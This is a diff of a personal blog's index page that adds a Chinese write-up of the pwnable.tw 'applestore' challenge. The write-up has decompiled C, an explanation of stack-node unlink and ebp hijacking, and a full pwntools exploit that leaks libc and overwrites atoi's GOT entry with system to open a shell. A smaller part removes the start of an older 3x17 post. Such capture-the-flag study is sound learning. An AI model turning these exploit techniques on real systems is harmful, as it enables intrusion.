@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">22</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -136,7 +136,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">16</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">17</span></a>
 
   </li>
         <li class="menu-item menu-item-commonweal">
@@ -195,6 +195,126 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2021/11/14/pwnable-tw-applestore-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="AvavaAYA">
+      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/14/pwnable-tw-applestore-writeup/" class="post-title-link" itemprop="url">pwnable-tw-applestore writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-14 16:22:06" itemprop="dateCreated datePublished" datetime="2021-11-14T16:22:06+08:00">2021-11-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-05 13:58:18" itemprop="dateModified" datetime="2022-03-05T13:58:18+08:00">2022-03-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-writeup/" itemprop="url" rel="index"><span itemprop="name">pwn-writeup</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <span id="more"></span>
+
+<h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><ul>
+<li>ebp劫持</li>
+<li>双向链表unlink实现任意地址写</li>
+<li>\0截断</li>
+</ul>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>  菜单题，进入ida分析，先看创建节点以及插入节点的函数:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> **__cdecl <span class="title function_">create</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> **v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> **v3; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="type">char</span> **)<span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  v2[<span class="number">1</span>] = a2;</span><br><span class="line">  asprintf(v2, <span class="string">&quot;%s&quot;</span>, a1);</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">insert</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = &amp;myCart; i[<span class="number">2</span>]; i = (_DWORD *)i[<span class="number">2</span>] )</span><br><span class="line">    ;</span><br><span class="line"><span class="comment">//遍历找到当前链表中最后一个节点</span></span><br><span class="line">  i[<span class="number">2</span>] = a1;</span><br><span class="line"><span class="comment">//i.fd = a1;</span></span><br><span class="line">  result = a1;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">12</span>) = i;</span><br><span class="line"><span class="comment">//a1.bk = i;</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  可以看出myCart中是一个双向链表，结构如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span>&#123;</span></span><br><span class="line">	<span class="type">char</span>* itemName;</span><br><span class="line">	<span class="type">char</span>* itemPrice;</span><br><span class="line">	item* fd;</span><br><span class="line">	item* bk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  接下来寻找漏洞点，发现程序中使用my_read函数提供了类似read的功能，多次出现”只需要一个字节的地方read了0x15字节”的现象:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">my_read(&amp;buf, <span class="number">0x15</span>u);</span><br></pre></td></tr></table></figure>
+<p>  如cart函数:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cart</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v2; <span class="comment">// [esp+18h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  _DWORD *i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+26h] [ebp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  my_read(&amp;buf, <span class="number">0x15</span>u);</span><br><span class="line"><span class="comment">//为了程序正常运行，ebp-22h与ebp-21h的位置需要分别填入&#x27;y&#x27;与&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment">//栈中可以控制的地址范围为从 ebp-20h 开始 </span></span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">121</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;==== Cart ====&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = (_DWORD *)dword_804B070; i; i = (_DWORD *)i[<span class="number">2</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v2++;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d: %s - $%d\n&quot;</span>, v0, *i, i[<span class="number">1</span>]);</span><br><span class="line">      v3 += i[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>  此外，还发现在checkout函数中存在条件判断:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">checkout</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">7174</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;*: iPhone 8 - $1&quot;</span>);</span><br><span class="line">    asprintf(&amp;v2, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;iPhone 8&quot;</span>);</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">    insert(&amp;v2);</span><br><span class="line">    v1 = <span class="number">7175</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Total: $%d\n&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Want to checkout? Maybe next time!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  这里的v2作为一个新建节点储存在栈中地址从ebp-0x20开始，观察其他函数: 当程序在handler函数中运行到cart()，checkout()，delete()等函数时，ebp是相同的，这也意味着在其他函数中也有机会修改ebp-0x20位置附近的值，达到修改iPhone8节点中fd、bk指针值的目的，进而可以达到泄露libc、unlink任意地址写的目的;<br>  另一方面来理解，此处的新增节点只是一个局部变量，可是程序却可以在退出该函数，局部变量失效的情况下再次访问这个节点，甚至可以理解为栈中的”UAF”;<br>  回到delete的代码:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v1; <span class="comment">// [esp+10h] [ebp-38h]</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// [esp+14h] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+18h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> nptr; <span class="comment">// [esp+26h] [ebp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = <span class="number">1</span>;</span><br><span class="line">  v2 = (_DWORD *)dword_804B070;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Item Number&gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  my_read(&amp;nptr, <span class="number">0x15</span>u);</span><br><span class="line">  v3 = atoi(&amp;nptr);</span><br><span class="line">  <span class="keyword">while</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v2[<span class="number">2</span>];</span><br><span class="line">      v5 = v2[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">        *(_DWORD *)(v5 + <span class="number">8</span>) = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">        *(_DWORD *)(v4 + <span class="number">12</span>) = v5;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Remove %d:%s from your shopping cart.\n&quot;</span>, v1, *v2);</span><br><span class="line">      <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v7;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">    v2 = (_DWORD *)v2[<span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  看到unlink实现的代码，我们确实能修改某些地址上的内容，但是这个”某些地址”也是有条件的，倘若直接rop修改handler函数返回地址为system地址，那么delete函数会同时修改system函数中的内容，造成程序崩溃;<br>  综上，delete中的unlink不能以system函数为目标，故切换思路，寻找程序中读取输入的函数，劫持其参数，达到写入system函数地址到got表完成got hijacking的目的;<br>  观察handler函数的内容发现:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> nptr; <span class="comment">// [esp+16h] [ebp-22h]</span></span><br><span class="line">my_read(&amp;nptr, <span class="number">0x15</span>u);</span><br><span class="line"><span class="keyword">switch</span> ( atoi(&amp;nptr) )</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>
+<p>  nptr, 即ebp-22h的地方可以利用，可以将handler函数的ebp劫持到got表atoi-22h的地方，nptr与atoi函数地址重叠，再读入system_addr 与 “;sh\x00”到该位置即可getshell;</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>  首先通过简单的计算构建出能生成iPhone8节点的输入:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	add(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	add(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">checkout()</span><br></pre></td></tr></table></figure>
+<p>  接下来，进到cart()函数中，利用myread来覆盖ebp-0x20(iphone8.itemName)处为puts的got表地址，以此泄露libc地址，通过链表遍历的办法来获得栈上节点地址:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leakAddr</span>(<span class="params">data</span>):</span><br><span class="line">	cart(data)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;27: &#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line">items_start_at = <span class="number">0x804B070</span></span><br><span class="line">libc_base = leakAddr(p32(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0</span>)*<span class="number">3</span>) - l.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">heap_base = leakAddr(p32(items_start_at) + p32(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">temp_addr = heap_base</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">	temp_addr = leakAddr(p32(temp_addr + <span class="number">8</span>) + p32(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">delet_ebp = temp_addr + <span class="number">0x20</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>  delete函数中同样能修改栈上节点的内容，通过delete函数完成unlink实现任意地址写:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;27&#x27;</span></span><br><span class="line">payload1 += p32(<span class="number">0</span>)*<span class="number">2</span> + p32(delet_ebp - <span class="number">0x0c</span>) + p32(e.got[<span class="string">&#x27;atoi&#x27;</span>] + <span class="number">0x22</span>)</span><br><span class="line">delete(payload1)</span><br></pre></td></tr></table></figure>
+<p>  接下来handler函数会调用myread读入nptr，只需传入system及其参数就可以完成getshell了:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload2 = p32(libc_base + l.symbols[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&quot;;sh\x00&quot;</span></span><br><span class="line">p.sendline(payload2)</span><br></pre></td></tr></table></figure>
+
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>  完整代码:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10104</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./applestore&quot;</span>)</span><br><span class="line">l = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">data</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Device Number&gt;&#x27;</span>)</span><br><span class="line">	p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkout</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Let me check your cart. ok? (y/n) &gt;&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;y\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cart</span>(<span class="params">data</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Let me check your cart. ok? (y/n) &gt;&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;y\x00&#x27;</span> + data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">data</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Item Number&gt;&#x27;</span>)</span><br><span class="line">	p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leakAddr</span>(<span class="params">data</span>):</span><br><span class="line">	cart(data)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;27: &#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line">items_start_at = <span class="number">0x804B070</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	add(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	add(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">checkout()</span><br><span class="line"></span><br><span class="line">libc_base = leakAddr(p32(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0</span>)*<span class="number">3</span>) - l.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">heap_base = leakAddr(p32(items_start_at) + p32(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">temp_addr = heap_base</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">	temp_addr = leakAddr(p32(temp_addr + <span class="number">8</span>) + p32(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">delet_ebp = temp_addr + <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;27&#x27;</span></span><br><span class="line">payload1 += p32(<span class="number">0</span>)*<span class="number">2</span> + p32(delet_ebp - <span class="number">0x0c</span>) + p32(e.got[<span class="string">&#x27;atoi&#x27;</span>] + <span class="number">0x22</span>)</span><br><span class="line">delete(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload2 = p32(libc_base + l.symbols[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&quot;;sh\x00&quot;</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -605,120 +725,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2021/11/13/pwnable-tw-3x17-writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="AvavaAYA">
-      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/13/pwnable-tw-3x17-writeup/" class="post-title-link" itemprop="url">pwnable-tw-3x17 writeup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-13 15:39:01" itemprop="dateCreated datePublished" datetime="2021-11-13T15:39:01+08:00">2021-11-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-15 19:45:49" itemprop="dateModified" datetime="2022-04-15T19:45:49+08:00">2022-04-15</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn-writeup/" itemprop="url" rel="index"><span itemprop="name">pwn-writeup</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>4.8k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <span id="more"></span>
-
-<h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><ul>
-<li>elf文件格式</li>
-<li>ROP</li>
-</ul>
-<hr>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p> 先checksec，amd64，有nx(其实也有canary但没检测出来)，没开PIE，拖入ida进行分析，发现扣掉了符号表;<br> readelf -h一下，找到程序入口点，标准的start函数:</p>
